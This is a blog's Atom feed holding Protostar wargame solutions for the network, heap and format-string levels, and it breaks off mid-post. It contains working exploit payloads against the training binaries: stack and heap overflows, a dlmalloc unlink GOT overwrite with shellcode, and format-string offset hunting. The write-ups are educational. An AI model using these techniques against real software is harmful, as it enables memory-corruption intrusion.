<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: protostar | ]]></title>
  <link href="http://hatRiot.github.io/blog/categories/protostar/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2018-05-24T23:45:52-07:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Protostar solutions - Network]]></title>
    <link href="http://hatRiot.github.io/blog/2014/11/23/protostar-network/"/>
    <updated>2014-11-23T13:10:04-08:00</updated>
    <id>http://hatRiot.github.io/blog/2014/11/23/protostar-network</id>
    <content type="html"><![CDATA[<p>Previous posts:</p>

<p><a href="http://hatriot.github.io/blog/2013/03/31/protostar-solutions-stack-levels/">Protostar &ndash; Stack</a><br/>
<a href="http://hatriot.github.io/blog/2014/09/16/protostar-format-strings/">Protostar &ndash; Format String</a><br/>
<a href="http://hatriot.github.io/blog/2014/09/21/protostar-heap-exploits/">Protostar &ndash; Heap</a></p>

<p>The network stages were pretty simple and emphasized more on data representation, rather than remote exploitation.</p>

<h2>Network 00</h2>

<p>The network levels all have binaries running on the system on various ports.  The first level runs on port 2999.  We can attach to the process with gdb and send over some junk data:</p>

<p>```</p>

<h1>echo &ldquo;xxxx&rdquo; | nc 192.168.1.106 2999</h1>

<p>Please send &lsquo;652467094&rsquo; as a little endian 32bit int
I&rsquo;m sorry, you sent 2021161080 instead
```</p>

<p>Looking at the <a href="https://exploit-exercises.com/protostar/net0/">source code</a>, we want to send a string that, when cast to an unsigned integer, equals some random value.  To do this, we simply open up a socket to the listener, read in the number, transform it to little endian, and send it back.  Using a bit of Python-fu we quickly arrive at a solution:</p>

<p>```
import socket
import struct
import sys
from re import findall</p>

<p>try:</p>

<pre><code>sock = socket.socket()
sock.connect(('192.168.1.106', 2999))

data = sock.recv(256)

m = findall("Please send '(.*?)' as", data)
if len(m) &gt; 0:
    m = int(m[0])
else:
    print 'No data received?'
    sys.exit(1)

print 'Swapping %s to little endian 32bit int' % m
swapped = struct.pack('&lt;Q', m)

print 'Swapped to %s' % repr(swapped)
sock.sendall(str(swapped))

data = sock.recv(512)
print data
</code></pre>

<p>except Exception, e:</p>

<pre><code>print e
</code></pre>

<p>finally:</p>

<pre><code>sock.close()
</code></pre>

<p>```</p>

<p>And when ran:</p>

<p>```</p>

<h1>python protostar_net0.py</h1>

<p>Swapping 1295208340 to little endian 32bit int
Swapped to &lsquo;\x94O3M\x00\x00\x00\x00&rsquo;
Thank you sir/madam
```</p>

<h2>Network 01</h2>

<p>This stage simply requires us to unpack an unsigned integer:</p>

<p>```
 unsigned int wanted;</p>

<p>  wanted = random();</p>

<p>  sprintf(fub, &ldquo;%d&rdquo;, wanted);</p>

<p>  if(write(0, &amp;wanted, sizeof(wanted)) != sizeof(wanted)) {</p>

<pre><code>  errx(1, ":(\n");
</code></pre>

<p>  }
```</p>

<p>Trivially accomplished with some struct packing:</p>

<p>```
import socket
import struct</p>

<p>try:</p>

<pre><code>sock = socket.socket()
sock.connect(('192.168.1.106', 2998))

data = sock.recv(256)

swapped = str(struct.unpack('&lt;I', data)[0])
print swapped
sock.sendall(swapped + '\r\n')
print sock.recv(256)
</code></pre>

<p>except Exception, e:</p>

<pre><code>print e
</code></pre>

<p>finally:</p>

<pre><code>sock.close()
</code></pre>

<p>```</p>

<p>Which gives us:</p>

<p>```</p>

<h1>python protostar_net1.py</h1>

<p>1413209085
you correctly sent the data
```</p>

<h2>Network 02</h2>

<p>The third network level tasks us with reading in 4 unsigned integers, adding them together, and sending back the result.  The &ldquo;trick&rdquo; in this stage, if you will, is that uint32 arithmetic needs to take into account wrapping.  To accomplish this, we want our result to never be negative, which requires us to define the result modulo 2<sup>n</sup>, where n = bit length.</p>

<p>This makes for a pretty simple stage:</p>

<p>```
import struct
import socket</p>

<p>try:</p>

<pre><code>sock = socket.socket()
sock.connect(('192.168.1.106', 2997))

# read in our four numbers
total = 0
for i in xrange(4):
    n = sock.recv(4)
    n = struct.unpack('&lt;I', n)[0]
    print 'Read digit %d' % n
    total += n

total = total &amp; 0xffffffffL
total = struct.pack('&lt;I', total)
sock.sendall(total)
print sock.recv(256)
</code></pre>

<p>except Exception, e:</p>

<pre><code>print e
</code></pre>

<p>finally:</p>

<pre><code>sock.close()
</code></pre>

<p>```</p>

<p>Note that we AND the final result by 2<sup>n</sup>, ensuring we have a positive 32 bit value.</p>

<p>When run:</p>

<p>```</p>

<h1>python protostar_net2.py</h1>

<p>Read digit 1533721612
Read digit 363484815
Read digit 1200915436
Read digit 1572177737
you added them correctly</p>

<p>```</p>

<h2>Network 03</h2>

<p>The most enjoyable of the four levels, this stage requires us to reverse a dead simple login routine and perform the login.  We&rsquo;ll start by checking out the code and figuring out what it&rsquo;s doing:</p>

<p>```
while(1) {</p>

<pre><code>  // from the connection, read in the total length of the packet, then
  // parse with ntohs and allocate the buffer with malloc
  nread(fd, &amp;len, sizeof(len));
  len = ntohs(len);
  buffer = malloc(len);

  if(! buffer) errx(1, "malloc failure for %d bytes", len);

  // read in LEN bytes into BUFFER
  nread(fd, buffer, len);
</code></pre>

<p>```</p>

<p>I&rsquo;ve commented the code inline to ease understanding.  Essentially, the first byte of our packet must be the total length of the packet.</p>

<p>```
  // switch on the first byte of the buffer
  switch(buffer[0]) {</p>

<pre><code>      // if the first byte is \x17, initiate login routine
      case 23:
          // invoke login() with buffer + 1 (skip length byte) and total len - 1 of the packet
          loggedin = login(buffer + 1, len - 1);
          send_string(fd, 33, loggedin ? "successful" : "failed");
          break;

      default:
          send_string(fd, 58, "what you talkin about willis?");
          break;
  }
</code></pre>

<p>```</p>

<p>If the first byte of the buffer (second in the packet) is \x17, it initiates login.</p>

<p>```
  deduct = get_string(&amp;resource, buffer, len);
  deduct += get_string(&amp;username, buffer+deduct, len-deduct);
  deduct += get_string(&amp;password, buffer+deduct, len-deduct);</p>

<p>  success = 0;
  success |= strcmp(resource, &ldquo;net3&rdquo;);
  success |= strcmp(username, &ldquo;awesomesauce&rdquo;);
  success |= strcmp(password, &ldquo;password&rdquo;);
```</p>

<p>Here&rsquo;s the real meat of the login routine; we need three, null-terminated strings that match &ldquo;net3&rdquo;, &ldquo;awesomesauce&rdquo;, and &ldquo;password&rdquo;, respectively, to successfully authenticate to the application.  The <code>get_string</code> fuction pulls these strings out one by one:</p>

<p>```
  unsigned char byte;</p>

<p>  byte = *buffer;</p>

<p>  // if it&rsquo;s malformed, i.e. not null term&rsquo;d
  if(byte > len) errx(1, &ldquo;badly formed packet&rdquo;);</p>

<p>  // malloc size of byte, which is the first byte at the start of the buffer
  *result = malloc(byte);</p>

<p>  // strcpy buffer + 1 into the result pointer location
  strcpy(*result, buffer + 1);</p>

<p>  // return number of bytes read
  return byte + 1;
```</p>

<p>The caveat here is that we need to prepend the string length to each entry, then null terminate it.  This was quite simple to hack up, once it&rsquo;d been reversed:</p>

<p>```
import struct
import socket</p>

<p>IP = &lsquo;192.168.1.106&rsquo;
PORT = 2996</p>

<p>try:</p>

<pre><code>sock = socket.socket()
sock.connect((IP, PORT))

resource = "net3\x00"
username = "awesomesauce\x00"
password = "password\x00"

# build login packet 
packet = struct.pack('B', 23)
packet += struct.pack('B', len(resource)) + resource
packet += struct.pack('B', len(username)) + username
packet += struct.pack('B', len(password)) + password
packet_len = struct.pack('&gt;H', len(packet))

print '[!] Sending packet (%d)' % (len(packet) + len(packet_len))

sock.sendall(packet_len + packet)

print sock.recv(128)
</code></pre>

<p>except Exception, e:</p>

<pre><code>print e
</code></pre>

<p>finally:</p>

<pre><code>sock.close()
</code></pre>

<p>```</p>

<p>Note that we&rsquo;re sending the packet length big endian due to the <code>ntohs</code> call returning a little endian value.  And once run:</p>

<p>```</p>

<h1>python protostar_net3.py</h1>

<p>[!] Sending packet (33)</p>

<p>!successful
```</p>

<h2>Network 04</h2>

<p>Although net04 is not listed anywhere on the site, I noticed that it was both running and available in the <code>/opt/protostar/bin</code> directory.  Disassembling it reveals the answer:</p>

<p><code>
 80497a8:   e8 ff f3 ff ff          call   8048bac &lt;srandom@plt&gt;
 80497ad:   8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 80497b1:   89 04 24                mov    DWORD PTR [esp],eax
 80497b4:   e8 a1 ff ff ff          call   804975a &lt;run&gt;
</code></p>

<p><main> does exactly what the rest of the stages have done: backgrounding the process as the current user, serving the socket up indefinitely, changing STDIO, and invoking run().  However, stage fours run is a big nop:</p>

<p><code>
0804975a &lt;run&gt;:
 804975a:   55                      push   ebp
 804975b:   89 e5                   mov    ebp,esp
 804975d:   5d                      pop    ebp
 804975e:   c3                      ret  
</code></p>

<p>Not so much of a stage!  On to the final stages.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar solutions - Heap Exploitation]]></title>
    <link href="http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits/"/>
    <updated>2014-09-21T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits</id>
    <content type="html"><![CDATA[<p>And we&rsquo;re back with Protostar, this time working on the heap section.</p>

<h2>Heap Exploits 0</h2>

<p>Introductory level that demonstrates overflowing heap structures.  It&rsquo;s pretty simple:</p>

<p><code>
user@protostar:/opt/protostar/bin$ objdump -dt heap0 | grep winner
08048464 g     F .text  00000014              winner
08048478 g     F .text  00000014              nowinner
08048464 &lt;winner&gt;:
08048478 &lt;nowinner&gt;:
</code></p>

<p>And then we find our EIP offset:</p>

<p>```
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>72 + &ldquo;B&rdquo;</em>4&rsquo;)
Starting program: /opt/protostar/bin/heap0 $(python -c &lsquo;print &ldquo;A&rdquo;<em>72 + &ldquo;B&rdquo;</em>4&rsquo;)
data is at 0x804a008, fp is at 0x804a050</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```</p>

<p>Using our mad exploit skills:</p>

<p><code>
$ ./heap0 $(python -c 'print "A"*72 + "\x64\x84\x04\x08"')
data is at 0x804a008, fp is at 0x804a050
level passed
</code></p>

<h2>Heap Exploits 1</h2>

<p>This challenge dives a bit more into heap exploitation with a nice write-what-where, and the goal is to redirect execution flow to the function <code>winner</code>.  Let&rsquo;s find that first:</p>

<p><code>
$ objdump -dt heap1 | grep winner
08048494 g     F .text  00000025              winner
</code></p>

<p>Now let&rsquo;s check out the actual bug:</p>

<p>```
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;B&rdquo;</em>4&rsquo;) xx
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap1 $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;B&rdquo;</em>4&rsquo;) xx</p>

<p>Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x42424242 <Address 0x42424242 out of bounds>, src=0xbffff9a3 &ldquo;xx&rdquo;) at strcpy.c:40
40  strcpy.c: No such file or directory.</p>

<pre><code>in strcpy.c
</code></pre>

<p>```</p>

<p>As we can see, we control the source (argument two) and the destination, address one, which is the result of a pointer overflow in the following code:</p>

<p><code>
strcpy(i1-&gt;name, argv[1]);
strcpy(i2-&gt;name, argv[2]);
</code></p>

<p>We have a couple of options for exploitation, but I chose to simply overwrite ebp+4 to take control over the return address.  Let&rsquo;s find that first:</p>

<p>```
(gdb) b *0x08048566
Breakpoint 1 at 0x8048566: file heap1/heap1.c, line 35.
(gdb) r xx yy
Starting program: /opt/protostar/bin/heap1 xx yy
and that&rsquo;s a wrap folks!</p>

<p>Breakpoint 1, main (argc=3, argv=0xbffff864) at heap1/heap1.c:35
35  heap1/heap1.c: No such file or directory.</p>

<pre><code>in heap1/heap1.c
</code></pre>

<p>(gdb) x/wx $ebp
0xbffff7b8: 0xbffff838
```</p>

<p>This shows ebp is located at 0xbffff7b8, so let&rsquo;s overwrite that:</p>

<p>```
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;B&rdquo;<em>4&rsquo;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap1 $(python -c &lsquo;print &ldquo;A&rdquo;</em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;<em>4 + &ldquo;B&rdquo;</em>4&rsquo;)
and that&rsquo;s a wrap folks!</p>

<p>Breakpoint 1, main (argc=0, argv=0xbffff844) at heap1/heap1.c:35
35  in heap1/heap1.c
(gdb) x/wx $ebp
0xbffff798: 0x41414141
(gdb) x/wx $ebp+4
0xbffff79c: 0x42424242
(gdb)
```</p>

<p>Note that ebp&rsquo;s address changed; this is a stupid method and is susceptible to stack shifting, so we need to ensure we accomodate for that.  Anyway, now we can control where we return to, so let&rsquo;s pop in our winning address:</p>

<p>```
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;\x94\x84\x04\x08&rdquo;&rsquo;)</p>

<p>Breakpoint 1, main (argc=0, argv=0xbffff844) at heap1/heap1.c:35
35  in heap1/heap1.c
(gdb) x/wx $ebp
0xbffff798: 0x41414141
(gdb) x/wx $ebp+4
0xbffff79c: 0x08048494
(gdb) c
Continuing.
and we have a winner @ 1410933753</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb)
```</p>

<p>And that&rsquo;s all!  Notice we still segfault, this is because we&rsquo;ve totally screwed up the stack, and it&rsquo;s trying to pop another value off the stack and return there.  We can trivally fix that by appending the address for exit:</p>

<p>```
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;\x94\x84\x04\x08&rdquo; + &ldquo;\xc0\x60\xec\xb7&rdquo;&rsquo;)
Starting program: /opt/protostar/bin/heap1 $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;\x94\x84\x04\x08&rdquo; + &ldquo;\xc0\x60\xec\xb7&rdquo;&rsquo;)
and that&rsquo;s a wrap folks!
and we have a winner @ 1410933890</p>

<p>Program exited with code 0124.
(gdb)
```</p>

<h2>Heap Exploits 2</h2>

<p>This one is pretty simple, and doesn&rsquo;t require us to really exploit much.  What we have is basically a contrived authentication service that&rsquo;s got four commands: auth, reset, service, and login.  The goal is to trigger the &ldquo;you have logged in already!&rdquo; message.  Here&rsquo;s the solution:</p>

<p><code>
user@protostar:/opt/protostar/bin$ ./heap2
[ auth = (nil), service = (nil) ]
auth xx
[ auth = 0x804c008, service = (nil) ]
service xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
</code></p>

<p>First we auth, which allocates the auth structure:</p>

<p>```
if(strncmp(line, &ldquo;auth &rdquo;, 5) == 0) {
  auth = malloc(sizeof(auth));
  memset(auth, 0, sizeof(auth));
  if(strlen(line + 5) &lt; 31) {</p>

<pre><code>strcpy(auth-&gt;name, line + 5);
</code></pre>

<p>  }
}
```</p>

<p>Then we execute service with a long string:</p>

<p>```
if(strncmp(line, &ldquo;service&rdquo;, 6) == 0) {</p>

<pre><code>  service = strdup(line + 7);
</code></pre>

<p>}
```</p>

<p>strdup duplicates a string, allocated via malloc.  Note in the auth struct allocation that it&rsquo;s only allocating <code>sizeof(auth)</code>.  This is an incorrect allocation, as it&rsquo;s really just allocating memory for a struct <em>pointer</em>, and not the 30 odd bytes for the structure.  We can easily demonstrate this with multiple auth struct allocations:</p>

<p><code>
$ ./heap2
[ auth = (nil), service = (nil) ]
auth 1
[ auth = 0x804c008, service = (nil) ]
auth 2
[ auth = 0x804c018, service = (nil) ]
</code></p>

<p>This 16 byte difference is comprised solely of chunk headers.  All we need to do is set the auth flag in the struct to some non-zero value, which can be done with the service command and our arbitrarily long string allocation.</p>

<p>```
if(strncmp(line, &ldquo;login&rdquo;, 5) == 0) {</p>

<pre><code>if(auth-&gt;auth) {
  printf("you have logged in already!\n");
} else {
  printf("please enter your password\n");
}
</code></pre>

<p>  }
```</p>

<h2>Heap Exploits 3</h2>

<p>This is the level that I thought more of these would be; this level requires us to manipulate heap metadata in order to obtain code execution.  Whilst this method is terribly outdated and not applicable at all to modern heaps, it&rsquo;s still a blast, and many of the high level methods still apply.</p>

<p>I highly, highly recommend reading the essential <a href="http://phrack.org/issues/57/9.html"><em>Once Upon A Free()</em></a> if you&rsquo;re unfamiliar with old school, dlmalloc heap exploitation, as there is quite a bit of prerequisite knowledge necessary to complete this stage.  I&rsquo;ll assume the reader has a cursory understanding of how this process will go down.</p>

<p>Much like the previous stages, we need to redirect the program to another function, <code>winner</code>.  Stage 3 executes three separate, 32 byte malloc&rsquo;s, strcpy&rsquo;s our input into each chunk, then free&rsquo;s them in <a href="http://webcache.googleusercontent.com/search?q=cache:TddtBQ76DO4J:exploit-exercises.com/protostar/heap3+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=us">reverse</a>:</p>

<p>```
a = malloc(32);
b = malloc(32);
c = malloc(32);</p>

<p>strcpy(a, argv[1]);
strcpy(b, argv[2]);
strcpy(c, argv[3]);</p>

<p>free&copy;;
free(b);
free(a);
```</p>

<p>Let&rsquo;s first check out the memory layout.  After all three allocations and strcpy&rsquo;s, but before any free&rsquo;s:</p>

<p><code>
(gdb) x/10wx 0x804c008-8
0x804c000:  0x00000000  0x00000029  0x41414141  0x00000000
0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000
(gdb) x/10wx 0x804c030-8
0x804c028:  0x00000000  0x00000029  0x42424242  0x00000000
0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c048:  0x00000000  0x00000000
(gdb) x/10wx 0x804c058-8
0x804c050:  0x00000000  0x00000029  0x43434343  0x00000000
0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000
(gdb)
</code></p>

<p>Recall that each chunk has metadata in-channel that allows dlmalloc to traverse, coalesce, and fetch chunks on the heap.  In the above case, three allocated chunks have two requisite fields: <code>prev_size</code> and <code>size</code>.  As none of the previous chunks in the heap have been free&rsquo;d, the<code>prev_size</code> field is 0x0.  The size field is 0x29, or 41.  The lower three bits are reserved in this field, so accounting for that:</p>

<p><code>
(gdb) p/d 0x29 &amp; ~3
$1 = 40
(gdb)      
</code></p>

<p>These three chunks are then free&rsquo;d in reverse order, starting from chunk c.  Exploitation for this rather straight forward, we just need to overflow adjacent metadata headers to craft an illicit chunk.  Once free enters its unlink macro, we obtain execution flow control.</p>

<p>We need to start by setting the <code>prev_size</code> and <code>size</code> fields to values that allow us to control forward and backward chunk pointers.  We begin by setting both fields to 0xffffffc, or -4.</p>

<p>```
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) BBBB CCCC
Starting program: /opt/protostar/bin/heap3 $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) BBBB CCCC</p>

<p>Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff824) at heap3/heap3.c:24
24  in heap3/heap3.c
(gdb) x/10wx 0x804c030-8
0x804c028:  0xfffffffc  0xfffffffc  0x42424242  0x00000000
0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c048:  0x00000000  0x00000000
```</p>

<p>We now shift to setting the flink and blink values, which are set once a chunk is freed.  Let&rsquo;s inspect these chunks after all three have been freed:</p>

<p><code>
(gdb) x/10wx 0x804c008-8
0x804c000:  0x00000000  0x00000029  0x0804c028  0x00000000
0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000
(gdb) x/10wx 0x804c030-8
0x804c028:  0x00000000  0x00000029  0x0804c050  0x00000000
0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c048:  0x00000000  0x00000000
(gdb) x/10wx 0x804c058-8
0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000
</code></p>

<p>The value after the <code>size</code> field is a forward pointer to the next free chunk.  There would typically be another pointer in the next field, a backwards link, however, dlmalloc employs what&rsquo;s known as fastbins.  This is a singly-linked list holding recently freed small chunks ( &lt; 64 bytes).  More on this can be found <a href="ftp://g.oswego.edu/pub/misc/malloc-2.7.0.c">here</a>.</p>

<p>Taking a quick peek at the exploitable unlink macro:</p>

<p>```</p>

<h1>define unlink(P, BK, FD)</h1>

<p>{
  BK = P->bk;
  FD = P->fd;
  FD->bk = BK;
  BK->fd = FD;
}
```
This macro will essentially update chunk pointers to, naturally, unlink a recently freed chunk.  This boils down to:</p>

<p><code>
*(next-&gt;fd + 12) = next-&gt;bk
*(next-&gt;bk + 8) = next-&gt;fd
</code></p>

<p>A simple write-what-where.  If we set fd to <code>return address - 0xc</code>, or the where, then bk is the what and ends up being the value popped into EIP.  Let&rsquo;s test this out by attempting to write 0x42424242 into chunk A:</p>

<p>```
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) $(python -c &lsquo;print &ldquo;B&rdquo;<em>4 + &ldquo;\xfc\xbf\x04\x08&rdquo; + &ldquo;B&rdquo;</em>4&rsquo;) CCCC
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap3 $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) $(python -c &lsquo;print &ldquo;B&rdquo;<em>4 + &ldquo;\xfc\xbf\x04\x08&rdquo; + &ldquo;B&rdquo;</em>4&rsquo;) CCCC</p>

<p>Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff814) at heap3/heap3.c:24
24  in heap3/heap3.c
(gdb) ni 3</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x08049906 in free (mem=0x804c030) at common/malloc.c:3638
3638    common/malloc.c: No such file or directory.
in common/malloc.c
(gdb) x/10wx 0x804c008-8
0x804c000:  0x00000000  0x00000029  0x42424242  0x41414141
0x804c010:  0x41414141  0x41414141  0x41414141  0x41414141
0x804c020:  0x41414141  0x41414141
(gdb)
```</p>

<p>So we can write a controlled value somewhere.  We&rsquo;ll take the path of least resistance for exploitation and overwrite the GOT entry for puts with the location of our shellcode, which will be a simple jump to the appropriate function.</p>

<p><code>
$ objdump -t --dynamic-relo ./heap3 | grep puts
0804b128 R_386_JUMP_SLOT   puts
</code></p>

<p>and winner:</p>

<p><code>
(gdb) p winner
$2 = {void (void)} 0x8048864 &lt;winner&gt;
</code></p>

<p>Since our return address needs to be at an offset of -0xc, we&rsquo;ll be using <code>0x804b11c</code> as the return address.  It is also worth noting that the first field of the chunk is clobbered during the free routine, so we&rsquo;ll need an offset of +4 there as well.</p>

<p>```
(gdb) r AAAA$(python -c &lsquo;print &ldquo;A&rdquo;<em>28 + &ldquo;\xfc\xff\xff\xff&rdquo; + &ldquo;\xfc\xff\xff\xff&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;\x41&rdquo;</em>4 + &ldquo;\x1c\xb1\x04\x08&rdquo; + &ldquo;\x0c\xc0\x04\x08&rdquo;&rsquo;) CCCC
The program being debugged has been started already.
Start it from the beginning? (y or n) y</p>

<p>Starting program: /opt/protostar/bin/heap3 AAAA$(python -c &lsquo;print &ldquo;A&rdquo;<em>28 + &ldquo;\xfc\xff\xff\xff&rdquo; + &ldquo;\xfc\xff\xff\xff&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;\x41&rdquo;</em>4 + &ldquo;\x1c\xb1\x04\x08&rdquo; + &ldquo;\x0c\xc0\x04\x08&rdquo;&rsquo;) CCCC</p>

<p>Breakpoint 1, 0x08048935 in main (argc=4, argv=0xbffff814) at heap3/heap3.c:24
24  heap3/heap3.c: No such file or directory.</p>

<pre><code>in heap3/heap3.c
</code></pre>

<p>(gdb) x/i $eip
0x8048935 &lt;main+172>:   call   0x8048790 &lt;puts@plt>
(gdb) si
0x08048790 in puts@plt ()
(gdb) x/i $eip
0x8048790 &lt;puts@plt>:   jmp    DWORD PTR ds:0x804b128
(gdb) ni
0x0804c00c in ?? ()
(gdb) x/wx $eip
0x804c00c:  0x41414141
(gdb)
```</p>

<p>This gives us about eight bytes until the clobbered field, but this is sufficient for our purposes.  Using metasm, we can generate shellcode for a simple <code>call winner</code>:</p>

<p><code>
metasm &gt; push 0x08048864; ret
"\x68\x64\x88\x04\x08\xc3"
metasm &gt;
</code></p>

<p><code>
user@protostar:/opt/protostar/bin$ ./heap3 AAAA$(python -c 'print "\x68\x64\x88\x04\x08\xc3" + "A"*22 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\x41"*4 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC
that wasn't too bad now, was it? @ 1411285668
user@protostar:/opt/protostar/bin$
</code></p>

<p>And that&rsquo;s it!  I really wish this level had more dlmalloc exploitation, or post-2004 stuff (see <a href="http://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt">here</a>), but this was fun as is.  Fusion seems to be an advanced version of Protostar, so here&rsquo;s to hoping there&rsquo;s more there.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar solutions - Format String]]></title>
    <link href="http://hatRiot.github.io/blog/2014/09/16/protostar-format-strings/"/>
    <updated>2014-09-16T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/09/16/protostar-format-strings</id>
    <content type="html"><![CDATA[<p>Wow it&rsquo;s been awhile since I&rsquo;ve taken a look at this box.  The last time I was here, I was working on the format string levels.  These levels have been done and documented to death, but hey, they&rsquo;re fun.  So, without further delay, lets begin.</p>

<p>I&rsquo;ll be assuming you know what a format string is, and if not, you can follow allowing with <a href="http://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf">this</a> great paper.</p>

<h2>Format String Level 00</h2>

<p>This level really just points out that vulnerabilities exist in <code>sprintf</code>, and isn&rsquo;t too different from any of the easier stack levels.  All we&rsquo;ve got to do is overwrite an integer on the stack with 0xdeadbeef.  A 64 byte buffer is allocated, our target integer is assigned to 0 (after the allocated buffer), and <code>snprintf</code> invoked.  So 64 bytes of junk followed by 4 bytes should give us&hellip;</p>

<p>```
(gdb) r $(python -c &ldquo;print &lsquo;A&rsquo;<em>64 + &lsquo;\xef\xbe\xad\xde&rsquo;&rdquo;)
Starting program: /opt/protostar/bin/format0 $(python -c &ldquo;print &lsquo;A&rsquo;</em>64 + &lsquo;\xef\xbe\xad\xde&rsquo;&rdquo;)</p>

<p>Breakpoint 1, vuln (string=0xbffff95f &lsquo;A&rsquo; <repeats 64 times>, &ldquo;ﾭ&rdquo;, <incomplete sequence \336>) at format0/format0.c:15
15  in format0/format0.c
(gdb) x/wx &amp;target
0xbffff75c: 0xdeadbeef
(gdb) x/wx &amp;target-4
0xbffff74c: 0x41414141
(gdb) c
Continuing.
you have hit the target correctly :)
```</p>

<h2>Format String Level 01</h2>

<p>Here&rsquo;s the first real format string vulnerability.  In it, <code>printf</code> is called without formatting specifiers, leading to a real format string vulnerability.  Our objective, like before, is to simply overwrite a static target variable, <code>target</code>, with anything.  Due to the variable not being on the local stack frame, we need to overwrite a specific address.  Let&rsquo;s first try and find that variable:</p>

<p><code>
user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
08049638 g     O .bss   00000004              target
user@protostar:/opt/protostar/bin$
</code></p>

<p>Note that ASLR/PIE is disabled on the system, so we can safely use this address as our writable target.  Now in order to actually write something to this address, we need to traverse the stack until we reach our controlled data, then use the <code>%n</code> to write the number of bytes written into a pointer found on the stack, our data.  I wrote a little script to help me find the offset:</p>

<p>```
import sys
from commands import getoutput</p>

<p>run = &ldquo;/opt/protostar/bin/format1 $(perl -e &lsquo;print \"AAAAAAAA\&rdquo; . \&ldquo;%08x.\"x{0}&rsquo; . \&rdquo;%x\&ldquo;)&rdquo;</p>

<p>print &lsquo;[!] Searching for offset..&rsquo;
for idx in range(1, 15000):</p>

<pre><code>tmp = getoutput(run.format(idx))
tmps = tmp.split('.')[:-1]
if '41414141' in tmps[len(tmps)-1]:
    print '[!] Format found at offset %d' % idx 
    print '[!] String: %s' % run.format(idx)
    break
</code></pre>

<p>```</p>

<p>We accommodate for misaligned addresses by supplying 8 bytes and searching for 4.  When this runs, we get our offset:</p>

<p><code>
user@protostar:/opt/protostar/bin$ python ~/test.py
[!] Searching for offset..
[!] Format found at offset 133
[!] String: /opt/protostar/bin/format1 $(perl -e 'print "AAAAAAAA" . "%08x."x133' . "%x")
user@protostar:/opt/protostar/bin$
</code></p>

<p>All we need to do is get the alignment right, and we&rsquo;ve got our address:</p>

<p>```
